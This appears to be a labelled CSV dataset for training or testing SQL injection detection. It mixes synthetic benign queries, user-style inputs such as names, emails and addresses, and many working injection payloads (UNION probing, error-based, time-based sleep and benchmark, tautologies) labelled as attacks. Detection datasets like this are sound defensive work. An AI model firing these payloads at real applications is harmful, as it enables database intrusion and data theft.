Query,SELECT,UNION,OR,AND,Label
"1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,1,1,1
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",1,0,0,1,1
69634179t,0,0,0,0,0
"1%""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,0,0,1,1
1   )    )    as zldh where 3302  =  3302 rlike   (  select   (  case when   (  1481  =  5677  )   then 1 else 0x28 end   )    )   --,1,0,0,0,1
  )   or pg_sleep  (  __TIME__  )  --,0,0,1,0,1
"   SELECT hall, origin, becomingFROM wear WHERE hat  IS NOT NULL",1,0,1,0,0
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,0,0,1
3702,0,0,0,0,0
"1   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,1,0,1
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,1,0,0,1
rom.val@rpdkorea.eg,0,0,1,0,0
40142,0,0,0,0,0
duffield@telelujo.coop,0,0,0,0,0
"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,0,0,1,1
tuneu,0,0,0,0,0
"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",0,0,1,1,1
-9708' where 8150  =  8150 or 6872  =  6872--,0,0,1,0,1
SELECT slip ( s FROM ago RIGHT JOIN,1,0,0,0,0
"1""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,0,1,1
"-6186' in boolean mode  )   union all select 2990,2990,2990#",1,1,0,0,1
"  UPDATE syllable SET regular =  'went', City =  'provide' WHERE deeply =  swung",0,0,0,0,0
" SELECT column_name ( s )  FROM no,former",1,0,1,0,0
SELECT * FROM careful ORDER BY brass DESC,1,0,1,0,0
admin'or 1  =  1 or ''  =  ',0,0,1,0,1
SELECT successful ( s )  FROM smooth SELECT rubber FROM father,1,0,0,0,0
3.62829E+15,0,0,0,0,0
calafell palmieri,0,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  'user_registration_email_setting_disable_email' LIMIT 1,1,0,0,0,0
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,0,0,0,1
"SELECT UCASE ( ""SQL Tutorial is FUN!"" ) ; ",1,0,1,0,0
cercs,0,0,0,0,0
franks.merayo@karldeux.ki,0,0,0,0,0
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ymnm'  =  'ymnm,1,0,0,1,1
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'agent_category', 'agent_city' )  AND tr.object_id IN  ( 28313, 28341 )  ORDER BY t.name ASC",1,0,1,1,0
1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,0,0,0,1,1
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1,0,1,0,1
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,0,0,1,1,1
SELECT AVG ( manufacturing ) FROM valley SELECT SUM ( see ) ,1,0,0,0,0
99ortadero,0,0,1,0,0
5164,0,0,0,0,0
91553356q,0,0,0,0,0
&apos; OR,0,0,1,0,1
16417,0,0,0,0,0
SELECT * FROM clay WHERE    NOT consist = 'cowboy',1,0,0,0,0
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""zcfa""  =  ""zcfa",1,0,1,1,1
SELECT * FROM dangerous,1,0,0,0,0
bakkum,0,0,0,0,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,1
"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1,0,1,0,1
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'xqkq'  =  'xqkq",1,0,1,1,1
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,0,1,0,1
fresia,0,0,0,0,0
"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0,1,1,1
1'+  (  select ntym where 4750  =  4750,1,0,0,0,1
torrescrcela,0,0,1,0,0
57584234p,0,0,0,0,0
3.15402E+15,0,0,0,0,0
SELECT * FROM planned,1,0,0,0,0
SELECT AVG ( long ) FROM heavy SELECT SUM ( bright ) ,1,0,0,0,0
SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
jara escobedo,0,0,0,0,0
"doctor diego madrazo, 180",0,0,1,0,0
peng1in,0,0,0,0,0
&,0,0,0,0,1
"  SELECT crowd AS struck, fly AS [smooth]  FROM continued",1,0,0,0,0
"-9622' union all select 7208,7208,7208,7208#",1,1,0,0,1
SELECT television ( s )  FROM bill SELECT transportation ( s ) ,1,0,1,0,0
"-1084'  )   union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1,1,0,0,1
"   SELECT review, helpful, afternoonFROM enter WHERE poor  IS NOT NULL",1,0,1,0,0
SELECT * FROM forth WHERE Price NOT BETWEEN 10 AND 20,1,0,1,1,0
SELECT volume ( s ) FROM girl INNER JOIN,1,0,0,0,0
2.30158E+15,0,0,0,0,0
"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",0,0,0,1,1
31640,0,0,0,0,0
SELECT * FROM grow WHERE three LIKE '%require%',1,0,0,0,0
SELECT hall ( s FROM shells RIGHT JOIN,1,0,0,0,0
1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,0,1,0,1
SELECT MIN ( honor )  AS flight FROM mad,1,0,1,0,0
remax ondetti,0,0,0,0,0
thuswald,0,0,0,0,0
19219,0,0,0,0,0
SELECT column_name FROM table1 UNION ALL,1,1,0,0,0
slavova@costablancarental.ug,0,0,0,0,0
34310,0,0,0,0,0
or '1'  =  '1'--,0,0,1,0,1
perr@pasajesaereosbaratos.pm,0,0,0,0,0
37257,0,0,0,0,0
SELECT * FROM  ( SELECT milk FROM opinion ) ,1,0,0,0,0
"-7482""   )    )     )   or 9077  =  2651",0,0,1,0,1
"1'  )   as lrif where 6525  =  6525 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1,1,1
SELECT AVG ( Price ) FROM fair,1,0,0,0,0
agujer4e2o,0,0,0,0,0
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,1
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_houzez_verification_success' LIMIT 1,1,0,0,0,0
kelcy,0,0,0,0,0
"  SELECT information,characteristic,ask FROM door LEFT JOIN Orders ON screen.liftID =  car.angry ORDER BY buried.got",1,0,1,0,0
"1""  )   as ymto where 3453  =  3453",0,0,0,0,1
SELECT COUNT ( wooden )  FROM church,1,0,0,0,0
DELETE FROM swept,0,0,0,0,0
israel_piggot@joyclub.pe,0,0,0,0,0
8776,0,0,0,0,0
3.36323E+15,0,0,0,0,0
SELECT AVG ( bigger ) FROM surprise,1,0,0,0,0
"   SELECT COUNT ( especially ) , crew FROM soldier BY height",1,0,0,0,0
"concordia, 102,",0,0,1,0,0
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",1,0,0,1,1
SELECT * FROM arrange ORDER BY southern DESC,1,0,1,0,0
1  )   as iqkf where 7780  =  7780,0,0,0,0,1
"1'  )   as yhgk where 9246  =  9246 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c9a3c611fd' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",1,0,1,1,0
SELECT AVG ( range ) FROM position SELECT SUM ( silver ) ,1,0,0,0,0
"   SELECT Employees.carbon, COUNT ( Orders.viewID )  AS dugFROM    ( OrdersINNER JOIN constantly ON Orders.islandID  =  Employees.blockID ) ",1,0,1,1,0
SELECT far ( s )  FROM fierce FULL OUTER JOIN,1,0,0,0,0
"  SELECT mineID AS ID, all AS property FROM shore",1,0,1,0,0
depravador,0,0,1,0,0
"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,1,1
"  SELECT * FROM machine WHERE fun NOT IN  ( 'moment', 'condition', 'earlier' )  ",1,0,0,0,0
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",1,0,0,1,1
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen,1,1,1,0,0
SELECT AVG ( Price ) FROM battle,1,0,0,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",0,0,0,0,1
84082482w,0,0,0,0,0
SELECT * FROM travel WHERE claws NOT LIKE 'escape%',1,0,0,0,0
SELECT * FROM amount WHERE part BETWEEN 'grandmother' AND 'card',1,0,0,1,0
1'  )   and 8404  =  8651#,0,0,0,1,1
granfiel,0,0,0,0,0
"  SELECT goldID AS ID, wheat AS running FROM poem",1,0,0,0,0
SELECT * FROM limited FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,0,0,1,1
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,0,1,0,1
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",0,0,0,1,1
pettinge,0,0,0,0,0
"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",1,0,0,0,1
"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,1,0,1
""" or """"&""",0,0,1,0,1
28660,0,0,0,0,0
wittik,0,0,0,0,0
20542773r,0,0,0,0,0
1'  )   as tqdg where 9355  =  9355,0,0,0,0,1
os,0,0,0,0,1
SELECT * FROM anyway WHERE master = 'title',1,0,0,0,0
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb",1,0,1,1,1
SELECT football ( s )  FROM lovely LEFT JOIN,1,0,0,0,0
SELECT * FROM castle FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
1'||  (  select 'sxya' where 3578  =  3578,1,0,0,0,1
"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",1,1,0,0,1
"1  )   as kqas where 7302  =  7302 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,1,1
1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,0,0,1,1
select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,1,0,0,0,1
"iif  (  3447  =  1084,1,1/0  )  ",0,0,0,0,1
1%' order by 1#,0,0,1,0,1
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",0,0,1,1,1
SELECT * FROM dirty WHERE whole = 'stood' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
nickolau,0,0,0,0,0
SELECT Count ( * )  AS thing,1,0,0,0,0
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",1,0,1,1,1
thirugna,0,0,0,0,0
crespo bullones,0,0,0,0,0
or '1'  =  '1,0,0,1,0,1
" SELECT column_name ( s )  FROM suggest,had",1,0,0,0,0
"1%'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,0,1,1
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,0,0,1
deli6escenci1,0,0,0,0,0
39638,0,0,0,0,0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",1,0,0,1,1
SELECT * FROM fell WHERE gulf = 'bee',1,0,0,0,0
DELETE FROM bank,0,0,0,0,0
"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",1,1,0,0,1
26707809w,0,0,0,0,0
2161,0,0,0,0,0
1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0,0,1,1
pruja lantadilla,0,0,0,0,0
hollywood.hausman@921.th,0,0,0,0,0
"-7448 union all select 4072,4072#",1,1,0,0,1
"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1,1,0,0,1
DELETE FROM union WHERE drew = 'gravity',0,1,0,0,0
SELECT AVG ( greatest ) FROM seen,1,0,0,0,0
"1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  1624  =  1624",0,0,0,1,1
chimillas,0,0,0,0,0
"-6357""  )   order by 1--",0,0,1,0,1
1%' and 7366  =  9197#,0,0,0,1,1
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",1,1,0,0,1
-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,0,1,0,1
"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,0,1,1
" SELECT * FROM his ORDER BY press ASC, ear DESC",1,0,1,0,0
"1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,1,1
"c/ altamira 179,",0,0,0,0,0
SELECT lonely,1,0,0,0,0
1  )   where 9078  =  9078 rlike sleep  (  5  )  #,0,0,0,0,1
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,0,1,0,1
"  SELECT Orders.probablyrID, Employees.place, Employees.there FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.rodID ORDER BY Orders.physicalID",1,0,1,0,0
"calle tajo, 182,",0,0,0,0,0
ma$c3donio,0,0,0,0,0
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,0,1,0,1
brewer,0,0,0,0,0
SELECT * FROM general WHERE minute LIKE '%stairs%',1,0,0,0,0
"1""   )    )    and 2006  =  2006",0,0,0,1,1
SELECT bigger ( s )  FROM mighty UNION ALL,1,1,0,0,0
almcita,0,0,0,0,0
17744,0,0,0,0,0
d012965226m6ent0,0,0,0,0,0
"  SELECT screenID AS ID, tiny AS swimming FROM become",1,0,0,0,0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",0,0,1,1,1
paleogrfico,0,0,0,0,0
DELETE FROM review,0,0,0,0,0
SELECT taken ( s )  FROM sleep UNION ALL,1,1,0,0,0
"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
SELECT quite ( s )  FROM tip UNION,1,1,0,0,0
marlowe,0,0,0,0,0
1,0,0,0,0,0
"-2125""   )    )    or 8571  =  8571--",0,0,1,0,1
" SELECT * FROM five ORDER BY limited, off",1,0,1,0,0
"   SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL",1,0,0,0,0
niwinska@estudiodeyoga.td,0,0,0,0,0
"1%"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,1,0,1,1,1
"carretera ribas matama 160,",0,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_site_logo' LIMIT 1,1,0,0,0,0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw,1,0,0,1,1
villaturiel,0,0,0,0,0
guasca,0,0,0,0,0
SELECT * FROM active 3,1,0,0,0,0
bollullos par del condado,0,0,0,0,0
ob7491,0,0,0,0,0
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,0,1,0,1
-3982   )    )    or 6872  =  6872 and    (    (   6331  =  6331,0,0,1,1,1
SELECT option_value FROM wp_options WHERE option_name  =  'options_twitter_url' LIMIT 1,1,0,0,0,0
yeste meloda,0,0,0,0,0
SELECT * FROM of WHERE garden = 'observe' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
" SELECT * FROM realize ORDER BY friend ASC, ask DESC",1,0,1,0,0
"plaza alfonso el batallador, 117,",0,0,1,0,0
86274990n,0,0,0,0,0
"1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,1,0,1
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",0,0,1,1,1
SELECT * FROM accurate WHERE branch BETWEEN 'handsome' AND 'although',1,0,0,1,0
FROM  ( SELECT DISTINCT strange FROM area ) ,1,0,0,0,0
SELECT TOP 3 * FROM heavy SELECT * FROM hide 3SELECT * FROM are,1,0,0,0,0
"   SELECT sides, sort, rose FROM came WHERE eye  IS NULL",1,0,1,0,0
SELECT * FROM alone WHERE wind BETWEEN correctly09/01/1996window AND been15/31/1996garden,1,0,1,1,0
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team',1,0,0,1,0
65358703v,0,0,0,0,0
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1,1,0,0,1
" select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",1,1,1,0,1
SELECT * FROM planned FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"calle padre payan 127,",0,0,0,0,0
19275,0,0,0,0,0
"1""  )   where 7957  =  7957 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,0,1,1
6e0turer2,0,0,0,0,0
   ( SELECT ProductID   FROM OrderDetails   WHERE Quantity  =  10 ) ;,1,0,1,0,0
SELECT * FROM molecular WHERE    NOT put = 'nest',1,0,0,0,0
"1,  (  case when 6620  =  3092 then 1 else null end  )  ",0,0,0,0,1
SELECT congress ( s ) FROM shirt INNER JOIN,1,0,0,0,0
SELECT * FROM give,1,0,0,0,0
SELECT AVG ( load ) FROM arrange,1,0,0,0,0
7016,0,0,0,0,0
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,0,0,0,1
37522,0,0,0,0,0
"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",1,0,1,1,1
"SELECT * FROM himself WHERE worker BETWEEN ""powder"" AND    ""move""",1,0,1,1,0
